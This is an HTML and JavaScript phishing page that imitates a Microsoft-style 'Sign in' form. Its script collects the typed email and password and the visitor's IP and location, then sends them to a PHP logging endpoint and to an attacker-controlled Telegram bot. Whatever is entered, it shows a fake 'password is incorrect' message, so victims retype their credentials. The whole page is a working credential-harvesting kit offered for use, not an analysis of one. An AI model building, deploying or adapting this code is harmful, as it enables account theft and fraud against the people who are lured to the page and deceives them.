<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>

    <style>
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: white;
        }

        .container {
            width: 100%;
            max-width: 440px;
            padding: 0 44px;
            text-align: center;
        }

        .icon-row {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 24px;
        }

        .icon {
            width: 24px;
            height: 24px;
            opacity: 0.6;
        }

        .brand-logo {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-gap: 1px;
            width: 24px;
            height: 24px;
        }

        .brand-logo div:nth-child(1) {
            background-color: #f25022;
        }
        .brand-logo div:nth-child(2) {
            background-color: #7fba00;
        }
        .brand-logo div:nth-child(3) {
            background-color: #00a4ef;
        }
        .brand-logo div:nth-child(4) {
            background-color: #ffb900;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 16px 0;
            color: #000;
        }

        .link-blue {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            cursor: pointer;
        }

        .link-blue:hover {
            text-decoration: underline;
        }

        .inputs {
            width: 100%;
            margin: 10px 0;
            padding: 14px 0 14px 10px;
            outline: none;
            border-radius: 3px;
            border: 1px solid #dedfda;
            box-sizing: border-box;
            font-size: 15px;
        }

        .inputs:focus {
            border-color: #0067b8;
        }

        .inputs.error {
            border-color: #ff4444;
        }

        .checkbox-wrap {
            display: flex;
            align-items: center;
            margin: 16px 0;
            text-align: left;
        }

        .checkbox-wrap input {
            margin-right: 8px;
        }

        .checkbox-wrap label {
            font-size: 15px;
            color: #000;
        }

        .btn-signin {
            display: block;
            background-color: #0067b8;
            color: white;
            border: none;
            width: 100%;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin: 4px 0 24px 0;
            border-radius: 3px;
            transition: background-color 0.2s;
        }

        .btn-signin:hover {
            background-color: #005da6;
        }

        .btn-signin:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .no-account {
            font-size: 13px;
            color: #000;
            margin-bottom: 24px;
        }

        .bottom-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 16px;
            text-align: left;
        }

        #feedback {
            font-size: 13px;
            color: #ff4444;
            display: none;
            text-align: left;
            margin: 4px 0 0 0;
        }

        #successMsg {
            font-size: 13px;
            color: #00c853;
            display: none;
            text-align: left;
            margin: 4px 0 0 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s ease-in-out infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .bot-status {
            font-size: 11px;
            color: #999;
            margin-top: 10px;
            text-align: center;
        }

        .bot-status .online {
            color: #00c853;
        }

        .bot-status .offline {
            color: #ff4444;
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 20px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- Icons Row -->
        <div class="icon-row">
            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#737373" d="M23 1.5q.41 0 .7.3.3.29.3.7v19q0 .41-.3.7-.29.3-.7.3H7q-.41 0-.7-.3-.3-.29-.3-.7V18H1q-.41 0-.7-.3-.3-.29-.3-.7V7q0-.41.3-.7Q.58 6 1 6h5V2.5q0-.41.3-.7.29-.3.7-.3zM6 13.28l1.42 2.66h2.14l-1.42-2.66h.86q.71 0 1.2-.49.49-.49.49-1.2V10.4q0-.71-.49-1.2-.49-.49-1.2-.49H6zm14-8.78H7V18h13zM12.5 15.5q-.21 0-.35-.15-.15-.14-.15-.35t.15-.35q.14-.15.35-.15t.35.15q.15.15.15.35t-.15.35q-.14.15-.35.15m.5-2h-1l-.5-5h2z" />
            </svg>

            </svg>

            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#737373" d="M22 8.2v7.6L17 12zm-6-5.7H4.5q-.5 0-.85.35-.35.35-.35.85v16q0 .5.35.85.35.35.85.35h11.5q.5 0 .85-.35.35-.35.35-.85v-5.8l5.8 3.65q.45.25.85.05.4-.2.4-.7v-10q0-.5-.4-.7-.4-.2-.85.05L18 10.8V4.5q0-.5-.35-.85-.35-.35-.85-.35zm0 7.2l-5.5-3.4-5.5 3.4v-5.7h11zm-11 1l5.5 3.4 5.5-3.4v5.7H5z" />
            </svg>

            <div class="brand-logo">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>

            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#737373" d="M12 2q-2.37 0-4.46.89-2.08.88-3.65 2.45Q2.32 6.9 1.44 8.98.55 11.07.55 13.44q0 2.38.89 4.46.88 2.09 2.45 3.65 1.57 1.57 3.65 2.45 2.09.89 4.46.89 2.38 0 4.46-.89 2.09-.88 3.65-2.45 1.57-1.56 2.45-3.65.89-2.08.89-4.46 0-2.37-.89-4.46-.88-2.08-2.45-3.64-1.56-1.57-3.65-2.45Q14.38 2 12 2m0 2q1.56 0 3.07.85-1.32 1.12-3.07 3.44-1.75-2.31-3.07-3.44Q10.44 4 12 4m-4.66 1.34q.85.94 2.38 2.81 1.53 1.88 2.28 3.35-1.5 1.8-2.28 3.35-.78 1.56-2.38 2.81-1.5-1.5-2.34-3.43-.85-1.94-.85-3.78 0-1.84.85-3.78.84-1.93 2.34-3.43m9.32 0q1.5 1.5 2.34 3.43.85 1.94.85 3.78 0 1.84-.85 3.78-.84 1.93-2.34 3.43-1.6-1.25-2.38-2.81-.78-1.55-2.28-3.35.75-1.47 2.28-3.35 1.53-1.87 2.38-2.81" />
            </svg>

            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#737373" d="M18 6q1.22 0 2.11.89.89.89.89 2.11 0 .47-.14.94.14.47.14.94 0 1.95-.76 3.7-.76 1.76-2.05 3.05-1.3 1.3-3.05 2.05-1.75.76-3.7.76-.47 0-.94-.14-.47.14-.94.14-1.22 0-2.11-.89Q6.56 18.66 6.56 17.44q0-.47.14-.94-.14-.47-.14-.94 0-1.95.76-3.7.76-1.76 2.05-3.05 1.3-1.3 3.05-2.05 1.75-.76 3.7-.76.47 0 .94.14.47-.14.94-.14m-6 10.5q2.07 0 3.54-1.46 1.46-1.47 1.46-3.54 0-.43-.09-.84-.09-.42-.26-.8l-1.13.34q-.06.28-.09.54-.03.27-.03.54 0 1.22-.89 2.11-.89.89-2.11.89-.27 0-.54-.03-.26-.03-.54-.09l-.34 1.13q.38.17.8.26.41.09.84.09M9.5 12q0-1.04.73-1.77.73-.73 1.77-.73.27 0 .54.03.26.03.54.09l.34-1.13q-.38-.17-.8-.26-.41-.09-.84-.09-2.07 0-3.54 1.46-1.46 1.47-1.46 3.54 0 .43.09.84.09.42.26.8l1.13-.34q.06-.28.09-.54.03-.27.03-.54z" />

            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path fill="#737373" d="M5 3v13.5l4.5 2.5 5-2.5v-5l-5 2.5-1.5-.75V3z" />
            </svg>
        </div>

        <h1>Sign in</h1>

        <input type="text" class="inputs" id="username" placeholder="Email or phone">
        <input type="password" class="inputs" id="password" placeholder="Password">
        <p id="feedback"></p>
        <p id="successMsg"></p>

        <div class="checkbox-wrap">
            <input type="checkbox" id="keepSigned">
            <label for="keepSigned">Keep me signed in</label>
        </div>

        <button type="button" id="loginBtn" class="btn-signin">Sign in</button>

        <div class="no-account">
            No account? <a href="#" class="link-blue" id="createAccount">Create one!</a>
        </div>

        <div class="bottom-links">
            <a href="#" class="link-blue" id="forgotPassword">Forgot my password</a>
            <a href="#" class="link-blue" id="singleUseCode">Sign in with a single-use code</a>
        </div>

        <div class="bot-status" id="botStatus"></div>
    </div>

    <!-- Hidden fields (fallback) -->
    <input type="hidden" id="country" value="Unknown">
    <input type="hidden" id="city" value="Unknown">
    <input type="hidden" id="continent" value="Unknown">
    <input type="hidden" id="ip" value="Unknown">

    <script>
        // ============================================
        // CONFIGURATION - PHP BACKEND
        // ============================================

        const API_BASE = window.location.origin;
        const SETTINGS_URL = API_BASE + '/data/settings.json';
        const PROCESS_URL = API_BASE + '/app/process.php';

        // ============================================
        // GLOBALS
        // ============================================
        let BOT_TOKEN = '';
        let CHAT_ID = '';
        let botReady = false;

        // DOM Elements
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const feedback = document.getElementById('feedback');
        const successMsg = document.getElementById('successMsg');
        const keepSigned = document.getElementById('keepSigned');
        const botStatus = document.getElementById('botStatus');

        let isProcessing = false;

        // ============================================
        // GET REAL LOCATION FROM ipapi.co
        // ============================================
        async function getRealLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                console.log('📍 Location detected:', data);
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    continent: data.continent_code || 'Unknown',
                    region: data.region || 'Unknown'
                };
            } catch (error) {
                console.warn('⚠️ ipapi.co failed, using fallback');
                return {
                    ip: document.getElementById('ip').value || 'Unknown',
                    country: document.getElementById('country').value || 'Unknown',
                    city: document.getElementById('city').value || 'Unknown',
                    continent: document.getElementById('continent').value || 'Unknown'
                };
            }
        }

        // ============================================
        // LOAD BOT SETTINGS
        // ============================================
        async function loadBotSettings() {
            try {
                const response = await fetch(SETTINGS_URL + '?t=' + Date.now());
                const data = await response.json();
                if (data.bot_token && data.chat_id) {
                    BOT_TOKEN = data.bot_token;
                    CHAT_ID = data.chat_id;
                    botReady = true;
                    botStatus.innerHTML = '';
                    botStatus.className = 'bot-status online';
                    console.log('✅ Bot settings loaded');
                } else {
                    botStatus.innerHTML = '';
                    botStatus.className = 'bot-status offline';
                }
            } catch (error) {
                botStatus.innerHTML = '⚠️ Bot not configured. Go to settings.';
                botStatus.className = 'bot-status offline';
                console.error('Error loading settings:', error);
            }
        }

        // ============================================
        // UPDATE BUTTON STATE
        // ============================================
        function updateButtonState() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (username.length > 0 && password.length > 0) {
                loginBtn.disabled = false;
                loginBtn.style.opacity = '1';
            } else {
                loginBtn.disabled = true;
                loginBtn.style.opacity = '0.6';
            }
        }

        usernameInput.addEventListener('input', function() {
            this.classList.remove('error');
            feedback.style.display = 'none';
            successMsg.style.display = 'none';
            updateButtonState();
        });

        passwordInput.addEventListener('input', function() {
            this.classList.remove('error');
            feedback.style.display = 'none';
            successMsg.style.display = 'none';
            updateButtonState();
        });

        updateButtonState();

        // ============================================
        // SHOW/HIDE ERROR
        // ============================================
        function showError(message) {
            feedback.textContent = message;
            feedback.style.display = 'block';
            successMsg.style.display = 'none';
            passwordInput.classList.add('error');
        }

        function showSuccess(message) {
            successMsg.textContent = message;
            successMsg.style.display = 'block';
            feedback.style.display = 'none';
            passwordInput.classList.remove('error');
        }

        function hideErrors() {
            feedback.style.display = 'none';
            successMsg.style.display = 'none';
            passwordInput.classList.remove('error');
            usernameInput.classList.remove('error');
        }

        // ============================================
        // SEND TO BACKEND (for logging)
        // ============================================
        function sendToBackend(username, password, location) {
            const url = `${PROCESS_URL}?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}&ip=${encodeURIComponent(location.ip)}&country=${encodeURIComponent(location.country)}&city=${encodeURIComponent(location.city)}&continent=${encodeURIComponent(location.continent)}`;
            console.log('📤 Sending to backend:', url);
            fetch(url).catch(() => console.error('Backend send failed'));
        }

        // ============================================
        // SEND TELEGRAM (from frontend)
        // ============================================
        async function sendTelegram(username, password, location) {
            if (!botReady) {
                console.warn('Bot not ready, skipping Telegram');
                return false;
            }

            const message = `🔐 *New Sign-in Attempt*\n\n` +
                `👤 Username: ${username}\n` +
                `🔑 Password: ${password}\n` +
                `🌐 IP: ${location.ip}\n` +
                `📍 Location: ${location.city}, ${location.country}\n` +
                `🌍 Continent: ${location.continent}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };

            console.log('📤 Sending Telegram from frontend...');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                if (result.ok) {
                    console.log('✅ Telegram sent successfully!');
                    return true;
                } else {
                    console.error('❌ Telegram error:', result);
                    return false;
                }
            } catch (error) {
                console.error('❌ Telegram fetch failed:', error);
                return false;
            }
        }

        // ============================================
        // LOGIN BUTTON
        // ============================================
        loginBtn.addEventListener('click', async function() {
            if (isProcessing) return;

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            hideErrors();

            // Validate
            if (!username) {
                showError('Please enter your email or phone number');
                usernameInput.classList.add('error');
                usernameInput.focus();
                return;
            }

            if (!password) {
                showError('Please enter your password');
                passwordInput.classList.add('error');
                passwordInput.focus();
                return;
            }

            // Show loading state
            isProcessing = true;
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="loading-spinner"></span> Signing in...';

            try {
                // Get location
                const location = await getRealLocation();

                // 1. Send to PHP backend for logging
                sendToBackend(username, password, location);

                // 2. Send Telegram from frontend
                if (botReady) {
                    await sendTelegram(username, password, location);
                } else {
                    console.log('⚠️ Bot not configured, skipping Telegram');
                }

                // Show error (always shows error - no redirect)
                setTimeout(function() {
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Sign in';
                    showError('The password you entered is incorrect. Please check your password and try again.');
                    passwordInput.value = '';
                    passwordInput.focus();
                    isProcessing = false;
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                loginBtn.disabled = false;
                loginBtn.textContent = 'Sign in';
                showError('An error occurred. Please try again.');
                isProcessing = false;
            }
        });

        // ============================================
        // ENTER KEY SUPPORT
        // ============================================
        usernameInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                passwordInput.focus();
            }
        });

        passwordInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                loginBtn.click();
            }
        });

        // ============================================
        // LINK HANDLERS
        // ============================================
        document.querySelectorAll('.link-blue').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                if (this.id === 'createAccount' || this.textContent.includes('Create one')) {
                    alert('Create new account - Redirect to signup page');
                } else if (this.id === 'forgotPassword' || this.textContent.includes('Forgot my password')) {
                    alert('Forgot password? Please contact support.');
                } else if (this.id === 'singleUseCode' || this.textContent.includes('single-use code')) {
                    alert('Sign in with a single-use code - Coming soon!');
                }
            });
        });

        // ============================================
        // LOAD SETTINGS ON PAGE LOAD
        // ============================================
        loadBotSettings();

        console.log('🚀 Sign in page ready with PHP Backend + Frontend Telegram!');
        console.log('📁 API Base:', API_BASE);
    </script>

</body>

</html>
